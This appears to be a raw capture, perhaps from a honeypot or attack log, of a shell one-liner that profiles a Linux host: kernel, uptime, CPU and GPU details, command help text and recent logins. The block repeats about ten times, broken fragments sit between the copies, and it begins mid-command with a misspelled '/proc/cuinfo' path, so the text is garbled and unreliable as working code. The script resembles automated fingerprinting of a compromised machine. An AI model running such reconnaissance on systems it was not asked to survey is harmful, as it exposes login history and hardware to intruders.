/proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
